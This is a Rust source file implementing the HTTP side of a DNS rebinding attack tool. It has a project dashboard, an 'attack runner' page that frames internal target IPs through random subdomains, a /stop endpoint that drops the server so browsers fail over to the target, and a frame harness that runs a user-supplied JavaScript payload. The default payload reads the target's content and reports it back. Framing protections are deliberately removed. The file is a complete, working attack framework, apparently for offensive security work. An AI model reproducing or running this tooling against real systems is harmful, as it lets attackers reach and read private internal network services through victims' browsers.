//! The two HTTP servers (built on [`axum`]) that pair with the DNS server.
//!
//! * [`serve_content`] runs on port 3000. It serves a **dashboard** (`/`) for
//!   creating/opening projects and a **runner** (`/run`) that drives the
//!   rebinding attempt using the currently-active project.
//! * [`serve_standard`] runs on a standard port (80 by default). It serves the
//!   **rebind frame** (with the active project's payload) and the `GET /stop`
//!   control endpoint.
//!
//! A *project* is a saved set of environment variables plus the JS payload (see
//! [`crate::project`]). The active project lives in shared state, so opening a
//! project immediately changes what the runner and the frame serve.

use std::collections::HashMap;
use std::net::IpAddr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;

use axum::extract::{Path, Query, Request, State};
use axum::http::{header, HeaderValue, StatusCode};
use axum::middleware::{from_fn, from_fn_with_state, Next};
use axum::response::{Html, Json, Response};
use axum::routing::{get, post};
use axum::Router;
use serde::Deserialize;
use serde_json::json;
use tokio::net::TcpListener;
use tokio::sync::Notify;

use crate::auth::{self, AuthDb};
use crate::dns::ip_to_label;
use crate::project::{self, Active, Project};

/// How long `/stop` keeps the standard server down when no `seconds` query
/// parameter is supplied.
const DEFAULT_STOP_SECONDS: u64 = 10;

/// Upper bound on how long `/stop` will keep the server offline, regardless of
/// the requested value.
const MAX_STOP_SECONDS: u64 = 20;

/// Middleware that makes every response framable cross-origin. We explicitly
/// drop any `X-Frame-Options` and set `Content-Security-Policy: frame-ancestors
/// *` so the master page (a different origin) can embed these pages in iframes.
async fn allow_framing(req: Request, next: Next) -> Response {
    let mut res = next.run(req).await;
    let headers = res.headers_mut();
    headers.remove(header::X_FRAME_OPTIONS);
    headers.insert(
        header::CONTENT_SECURITY_POLICY,
        HeaderValue::from_static("frame-ancestors *"),
    );
    res
}

// ------------------------------------------------------------------ content

/// Deployment settings that come from the environment / `.env` only and are
/// NOT part of a project (they identify where/how this server runs).
#[derive(Clone)]
pub struct Deploy {
    /// Delegated base domain, e.g. `rebind.example.com`.
    pub hostname: String,
    /// Public IP of our standard-port server (browsers connect here first).
    pub server_ip: IpAddr,
    /// Real standard-port the server listens on (for iframe URLs / `/stop`).
    pub standard_port: u16,
}

/// Shared state for the master/content server.
#[derive(Clone)]
struct MasterState {
    /// Currently-active project (shared with the standard server).
    active: Active,
    /// Environment-only deployment settings.
    deploy: Deploy,
    /// Payload used to seed brand-new projects (the startup payload).
    default_payload: Arc<String>,
}

/// Serve the dashboard + runner + project API on `bind` (default `:3000`).
pub async fn serve_content(
    bind: &str,
    active: Active,
    deploy: Deploy,
    default_payload: String,
    auth_db: AuthDb,
) -> Result<(), Box<dyn std::error::Error>> {
    let state = MasterState {
        active,
        deploy,
        default_payload: Arc::new(default_payload),
    };

    let app = Router::new()
        .route("/", get(dashboard))
        .route("/run", get(runner))
        .route("/api/projects", get(api_list))
        .route("/api/defaults", get(api_defaults))
        .route("/api/deploy", get(api_deploy))
        .route("/api/project/:name", get(api_get).post(api_save))
        .route("/api/open/:name", post(api_open))
        .route("/api/active", get(api_active).post(api_set_active))
        // Gate every master route behind HTTP Basic auth. The standard-port
        // server is deliberately left open (it serves the rebind frame).
        .layer(from_fn_with_state(auth_db, auth::require_auth))
        .layer(from_fn(allow_framing))
        .with_state(state);

    let listener = TcpListener::bind(bind).await?;
    tracing::info!("content listening on http://{bind} (dashboard / ; runner /run)");
    axum::serve(listener, app).await?;
    Ok(())
}

// ---- project API ----

#[derive(Deserialize)]
struct ProjectBody {
    #[serde(default)]
    targets: Vec<String>,
    #[serde(default)]
    stop_seconds: u64,
    #[serde(default)]
    payload: String,
}

async fn api_list() -> Json<Vec<String>> {
    Json(project::list())
}

async fn api_defaults(State(s): State<MasterState>) -> Json<Project> {
    Json(Project::default_from_env("", &s.default_payload))
}

async fn api_deploy(State(s): State<MasterState>) -> Json<serde_json::Value> {
    Json(json!({
        "hostname": s.deploy.hostname,
        "server_ip": s.deploy.server_ip.to_string(),
        "standard_port": s.deploy.standard_port,
    }))
}

async fn api_get(Path(name): Path<String>) -> Result<Json<Project>, (StatusCode, String)> {
    project::load(&name)
        .map(Json)
        .map_err(|e| (StatusCode::NOT_FOUND, e.to_string()))
}

async fn api_save(
    State(s): State<MasterState>,
    Path(name): Path<String>,
    Json(body): Json<ProjectBody>,
) -> Result<Json<Project>, (StatusCode, String)> {
    let project = Project {
        name,
        targets: body.targets,
        stop_seconds: body.stop_seconds.min(20),
        payload: body.payload,
    };
    project::save(&project).map_err(|e| (StatusCode::BAD_REQUEST, e.to_string()))?;
    *s.active.write().unwrap() = project.clone();
    tracing::info!("saved & activated project '{}'", project.name);
    Ok(Json(project))
}

async fn api_open(
    State(s): State<MasterState>,
    Path(name): Path<String>,
) -> Result<Json<Project>, (StatusCode, String)> {
    let project = project::load(&name).map_err(|e| (StatusCode::NOT_FOUND, e.to_string()))?;
    *s.active.write().unwrap() = project.clone();
    tracing::info!("opened & activated project '{}'", project.name);
    Ok(Json(project))
}

async fn api_active(State(s): State<MasterState>) -> Json<Project> {
    Json(s.active.read().unwrap().clone())
}

async fn api_set_active(
    State(s): State<MasterState>,
    Json(project): Json<Project>,
) -> Json<Project> {
    *s.active.write().unwrap() = project.clone();
    tracing::info!("set active (unsaved) project '{}'", project.name);
    Json(project)
}

// ---- pages ----

async fn dashboard() -> Html<&'static str> {
    Html(DASHBOARD_HTML)
}

async fn runner(State(s): State<MasterState>) -> Html<String> {
    let project = s.active.read().unwrap().clone();
    Html(render_runner(&project, &s.deploy))
}

/// Render the runner page. Deployment values (hostname, server IP, port) come
/// from the environment; the targets/stop window come from the active project.
fn render_runner(project: &Project, deploy: &Deploy) -> String {
    let server_ip = deploy.server_ip;
    let standard_port = deploy.standard_port;
    let server_label = ip_to_label(server_ip);
    let targets_js = project
        .target_ips()
        .iter()
        .map(|ip| format!("{{ip:{:?},label:{:?}}}", ip.to_string(), ip_to_label(*ip)))
        .collect::<Vec<_>>()
        .join(",");

    format!(
        r#"<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>rebind :: runner</title>
<style>
  body {{ font-family: system-ui, sans-serif; margin: 1.5rem; }}
  #log {{ white-space: pre-wrap; font-family: monospace; background:#111; color:#0f0;
          padding:1rem; border-radius:6px; min-height:8rem; }}
  iframe {{ width: 360px; height: 70px; border: 1px solid #ccc; margin: 4px; }}
  .frame-label {{ font-family: monospace; font-size: 12px; color:#555; }}
  a {{ color:#06c; }}
</style>
</head>
<body>
  <p><a href="/">&larr; dashboard</a></p>
  <h1>rebind runner &mdash; project: {project_name}</h1>
  <p>One iframe per target. Each loads
     <code>&lt;server_ip&gt;.&lt;rebind_ip&gt;.&lt;random&gt;.{hostname}</code>.
     The master pings each frame; frames that don't pong are reloaded with a
     fresh random label until they point at this server.</p>
  <div id="frames"></div>
  <h2>Log</h2>
  <div id="log"></div>

<script>
const HOSTNAME      = {hostname:?};
const SERVER_IP     = {server_ip:?};
const SERVER_LABEL  = {server_label:?};
const STANDARD_PORT = {standard_port};
const STOP_SECONDS  = {stop_seconds};
const TARGETS       = [{targets_js}];

const PING_INTERVAL = 1500;
const PONG_TIMEOUT  = 600;
const EXECUTE_DELAY = 600;

const PORT_SUFFIX = STANDARD_PORT === 80 ? "" : ":" + STANDARD_PORT;
const logEl = document.getElementById('log');
function log(m) {{ logEl.textContent += m + "\n"; console.log(m); }}

function rnd() {{ return "r" + Math.random().toString(36).slice(2, 10); }}
function hostFor(t) {{ return SERVER_LABEL + "." + t.label + "." + rnd() + "." + HOSTNAME; }}

let nonceCounter = 0;
let executed = false;
const frames = [];

function build() {{
  const container = document.getElementById('frames');
  if (!TARGETS.length) {{ log("no targets configured for this project"); return; }}
  TARGETS.forEach((t, i) => {{
    const f = {{ id: i, target: t, host: hostFor(t), confirmed: false,
                lastNonce: 0, awaiting: false }};
    const wrap = document.createElement('div');
    f.cap = document.createElement('div');
    f.cap.className = 'frame-label';
    f.el = document.createElement('iframe');
    f.el.src = "http://" + f.host + PORT_SUFFIX + "/";
    f.cap.textContent = "target " + t.ip + "  via  " + f.host;
    wrap.appendChild(f.cap);
    wrap.appendChild(f.el);
    container.appendChild(wrap);
    frames.push(f);
    log("frame " + i + " -> " + f.host);
  }});
}}

function reload(f) {{
  f.host = hostFor(f.target);
  f.confirmed = false;
  f.awaiting = false;
  f.cap.textContent = "target " + f.target.ip + "  via  " + f.host;
  f.el.src = "http://" + f.host + PORT_SUFFIX + "/";
}}

function tick() {{
  if (executed) return;
  if (frames.length && frames.every((f) => f.confirmed)) return onAllConfirmed();
  frames.forEach((f) => {{
    if (f.confirmed) return;
    const nonce = ++nonceCounter;
    f.lastNonce = nonce;
    f.awaiting = true;
    try {{ f.el.contentWindow.postMessage({{ type: "ping", nonce, id: f.id }}, "*"); }}
    catch (e) {{}}
    setTimeout(() => {{
      if (executed || f.confirmed) return;
      if (f.awaiting && f.lastNonce === nonce) {{
        log("frame " + f.id + " (" + f.target.ip + ") no pong -> reload w/ fresh random");
        reload(f);
      }}
    }}, PONG_TIMEOUT);
  }});
  setTimeout(tick, PING_INTERVAL);
}}

window.addEventListener('message', (e) => {{
  const d = e.data || {{}};
  if (d.type === "pong") {{
    const f = frames.find((x) => x.lastNonce === d.nonce);
    if (f && !f.confirmed) {{
      f.confirmed = true;
      f.awaiting = false;
      const n = frames.filter((x) => x.confirmed).length;
      log("pong: frame " + f.id + " (" + f.target.ip + ") on our server (" +
          n + "/" + frames.length + ")");
      if (frames.every((x) => x.confirmed)) onAllConfirmed();
    }}
  }} else if (d.type === "result") {{
    const f = frames.find((x) => x.host === d.host);
    log("PAYLOAD frame " + (f ? f.id : "?") + " " + d.host + " -> " +
        JSON.stringify(d.data));
  }} else if (d.type === "error") {{
    const f = frames.find((x) => x.host === d.host);
    log("ERROR frame " + (f ? f.id : "?") + " " + d.host + ": " + d.error);
  }}
}});

async function onAllConfirmed() {{
  if (executed) return;
  executed = true;
  log("all " + frames.length + " frame(s) confirmed on our server");
  log("calling /stop on " + SERVER_IP + " for " + STOP_SECONDS + "s");
  try {{
    await fetch("http://" + SERVER_IP + PORT_SUFFIX + "/stop?seconds=" + STOP_SECONDS,
                {{ mode: "no-cors" }});
  }} catch (e) {{ log("stop fetch error (continuing): " + e); }}
  await new Promise((r) => setTimeout(r, EXECUTE_DELAY));
  log("signaling frames to execute (origin now fails over to target)");
  frames.forEach((f) => {{
    try {{ f.el.contentWindow.postMessage({{ type: "execute" }}, "*"); }} catch (e) {{}}
  }});
}}

build();
setTimeout(tick, 500);
</script>
</body>
</html>
"#,
        project_name = project.name,
        hostname = deploy.hostname,
        server_ip = server_ip.to_string(),
        server_label = server_label,
        standard_port = standard_port,
        stop_seconds = project.stop_seconds_clamped(),
        targets_js = targets_js,
    )
}

/// The project-management dashboard (a small vanilla-JS SPA over the API).
const DASHBOARD_HTML: &str = r##"<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>rebind :: projects</title>
<style>
  body { font-family: system-ui, sans-serif; margin: 1.5rem; }
  .wrap { display: flex; gap: 2rem; align-items: flex-start; }
  .side { min-width: 240px; }
  .main { flex: 1; max-width: 900px; }
  ul { list-style: none; padding: 0; }
  li { display: flex; justify-content: space-between; gap: .5rem; margin: .25rem 0; }
  input, textarea { font-family: monospace; }
  textarea, input.wide { width: 100%; box-sizing: border-box; }
  button { cursor: pointer; }
  label { display: block; margin: .5rem 0; }
  #deploy { background:#f4f4f4; border-radius:6px; padding:.5rem .75rem; font-size:13px; }
  #deploy code { color:#333; }
  #status { background:#111; color:#0f0; padding:.5rem; border-radius:6px; min-height:1.5rem; white-space:pre-wrap; }
  h1 a, .side a { color:#06c; text-decoration:none; }
</style>
</head>
<body>
  <h1>rebind &mdash; projects</h1>
  <div class="wrap">
    <div class="side">
      <h2>Projects</h2>
      <ul id="projlist"></ul>
      <button id="newbtn">+ New (from .env defaults)</button>
      <p>Active: <b id="activename">&mdash;</b></p>
      <p><a id="runlink" href="/run" target="_blank">Open attack runner &#8599;</a></p>
      <h3>Deployment <small>(.env only)</small></h3>
      <div id="deploy">loading&hellip;</div>
    </div>
    <div class="main">
      <h2>Project configuration</h2>
      <label>Name <input id="name" class="wide" placeholder="project-name"></label>
      <label>Targets <small>(comma-separated IPs &mdash; one iframe each)</small>
        <input id="targets" class="wide" placeholder="10.0.0.5, 10.0.0.6"></label>
      <label>Stop seconds <small>(max 20)</small>
        <input id="stop" type="number" min="0" max="20"></label>
      <label>Payload &mdash; <code>async function runPayload(rebind)</code>
        <textarea id="payload" rows="16"></textarea></label>
      <p>
        <button id="savebtn">Save &amp; Activate</button>
        <button id="activatebtn">Set Active (no save)</button>
      </p>
      <pre id="status"></pre>
    </div>
  </div>

<script>
const $ = (id) => document.getElementById(id);
function status(m) { $("status").textContent = m; }

async function api(method, path, body) {
  const opt = { method, headers: {} };
  if (body !== undefined) {
    opt.headers["content-type"] = "application/json";
    opt.body = JSON.stringify(body);
  }
  const res = await fetch(path, opt);
  if (!res.ok) throw new Error(method + " " + path + " -> " + res.status + " " + (await res.text()));
  const ct = res.headers.get("content-type") || "";
  return ct.includes("json") ? res.json() : res.text();
}

function readForm() {
  const targets = $("targets").value.split(",").map((s) => s.trim()).filter((s) => s);
  return {
    name: $("name").value.trim(),
    targets,
    stop_seconds: Math.min(20, parseInt($("stop").value, 10) || 0),
    payload: $("payload").value,
  };
}

function fillForm(p) {
  $("name").value = p.name || "";
  $("targets").value = (p.targets || []).join(", ");
  $("stop").value = p.stop_seconds ?? 20;
  $("payload").value = p.payload || "";
}

async function refreshProjects() {
  const list = await api("GET", "/api/projects");
  const ul = $("projlist");
  ul.innerHTML = "";
  if (!list.length) ul.innerHTML = "<li><i>(none saved)</i></li>";
  list.forEach((n) => {
    const li = document.createElement("li");
    li.innerHTML = "<span></span> <button>Open</button>";
    li.querySelector("span").textContent = n;
    li.querySelector("button").onclick = () => openProject(n);
    ul.appendChild(li);
  });
}

async function loadDeploy() {
  const d = await api("GET", "/api/deploy");
  const port = d.standard_port === 80 ? "" : ":" + d.standard_port;
  $("deploy").innerHTML =
    "hostname: <code></code><br>server IP: <code></code><br>standard port: <code></code>";
  const codes = $("deploy").querySelectorAll("code");
  codes[0].textContent = d.hostname;
  codes[1].textContent = d.server_ip;
  codes[2].textContent = d.standard_port + port;
}

async function openProject(n) {
  const p = await api("POST", "/api/open/" + encodeURIComponent(n));
  fillForm(p);
  $("activename").textContent = p.name;
  status("Opened & activated: " + p.name);
}

async function newProject() {
  const p = await api("GET", "/api/defaults");
  fillForm(p);
  $("name").value = "";
  status("New project seeded from .env defaults. Set a name and Save.");
}

async function save() {
  const p = readForm();
  if (!p.name) { status("Please set a project name (letters, digits, - and _ only)."); return; }
  try {
    const saved = await api("POST", "/api/project/" + encodeURIComponent(p.name),
                            { targets: p.targets, stop_seconds: p.stop_seconds, payload: p.payload });
    await refreshProjects();
    $("activename").textContent = saved.name;
    status("Saved & activated: " + saved.name);
  } catch (e) { status(String(e)); }
}

async function activate() {
  const p = readForm();
  await api("POST", "/api/active", p);
  $("activename").textContent = p.name || "(unsaved)";
  status("Set active (not saved): " + (p.name || "(unsaved)"));
}

async function init() {
  $("newbtn").onclick = newProject;
  $("savebtn").onclick = save;
  $("activatebtn").onclick = activate;
  await loadDeploy();
  await refreshProjects();
  const active = await api("GET", "/api/active");
  fillForm(active);
  $("activename").textContent = active.name || "(unsaved)";
}
init();
</script>
</body>
</html>
"##;

// ----------------------------------------------------------------- standard

/// Shared state for the standard-port server.
struct AppState {
    /// Fired by `/stop` to trigger graceful shutdown of the current listener.
    notify: Notify,
    /// How many seconds the server should stay down after the next stop.
    seconds: AtomicU64,
    /// Active project (used to render the frame payload per request).
    active: Active,
}

/// Serve on a standard port (`bind`, default `0.0.0.0:80`). Serves the rebind
/// frame (with the active project's payload) and the `/stop` control endpoint.
pub async fn serve_standard(bind: &str, active: Active) -> Result<(), Box<dyn std::error::Error>> {
    let state = Arc::new(AppState {
        notify: Notify::new(),
        seconds: AtomicU64::new(DEFAULT_STOP_SECONDS),
        active,
    });

    loop {
        let listener = match TcpListener::bind(bind).await {
            Ok(l) => l,
            Err(e) => {
                tracing::warn!("bind {bind} failed: {e}; retrying in 1s");
                tokio::time::sleep(Duration::from_secs(1)).await;
                continue;
            }
        };

        let app = Router::new()
            .route("/stop", get(stop_handler))
            .fallback(get(frame_page))
            .layer(from_fn(allow_framing))
            .with_state(state.clone());

        tracing::info!("standard listening on http://{bind} (control: GET /stop[?seconds=N])");

        let shutdown_state = state.clone();
        axum::serve(listener, app)
            .with_graceful_shutdown(async move {
                shutdown_state.notify.notified().await;
            })
            .await?;

        let secs = state.seconds.load(Ordering::SeqCst);
        tracing::info!("standard paused; port {bind} closed for {secs}s");
        tokio::time::sleep(Duration::from_secs(secs)).await;
        tracing::info!("standard resuming");
    }
}

async fn stop_handler(
    State(state): State<Arc<AppState>>,
    Query(params): Query<HashMap<String, String>>,
) -> Json<serde_json::Value> {
    let secs = params
        .get("seconds")
        .and_then(|s| s.parse::<u64>().ok())
        .unwrap_or(DEFAULT_STOP_SECONDS)
        .min(MAX_STOP_SECONDS);

    state.seconds.store(secs, Ordering::SeqCst);
    state.notify.notify_one();
    tracing::info!("/stop -> pausing for {secs}s");

    Json(json!({ "status": "stopping", "seconds": secs }))
}

async fn frame_page(State(state): State<Arc<AppState>>) -> Html<String> {
    let payload = state.active.read().unwrap().payload.clone();
    Html(render_frame(&payload))
}

/// Built-in fallback payload, used when no payload file is configured/readable.
/// It reads the rebound target's root and reports status, length and a sample.
/// Configure your own via `REBIND_PAYLOAD_FILE` (see `payload.js`).
pub const DEFAULT_PAYLOAD: &str = r#"// Default placeholder payload.
async function runPayload(rebind) {
  const res = await fetch("/", { cache: "no-store" });
  const body = await res.text();
  rebind.report({ status: res.status, length: body.length, sample: body.slice(0, 200) });
}
"#;

/// Render the rebind frame: a fixed harness that answers `ping` with `pong` and,
/// on `execute`, invokes the configured `runPayload(rebind)`. The harness hands
/// the payload a `rebind` helper:
///   * `rebind.host`         — the current origin hostname
///   * `rebind.report(data)` — send a `result` (with arbitrary `data`) to master
///   * `rebind.error(err)`   — send an `error` to master
/// The payload may be sync or async; thrown/rejected errors are reported.
fn render_frame(payload_js: &str) -> String {
    format!(
        r#"<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>rebind :: frame</title></head>
<body>
<p>rebind frame</p>
<script>
const rebind = {{
  host: location.hostname,
  report: (data) => parent.postMessage(
    {{ type: "result", host: location.hostname, data }}, "*"),
  error: (err) => parent.postMessage(
    {{ type: "error", host: location.hostname, error: String(err) }}, "*"),
}};

window.addEventListener("message", (e) => {{
  const d = e.data || {{}};
  if (d.type === "ping") {{
    parent.postMessage(
      {{ type: "pong", nonce: d.nonce, id: d.id, host: location.hostname }}, "*");
  }} else if (d.type === "execute") {{
    try {{
      Promise.resolve(runPayload(rebind)).catch((err) => rebind.error(err));
    }} catch (err) {{
      rebind.error(err);
    }}
  }}
}});

// ===== configured payload (active project) =====
{payload_js}
</script>
</body>
</html>
"#,
        payload_js = payload_js,
    )
}
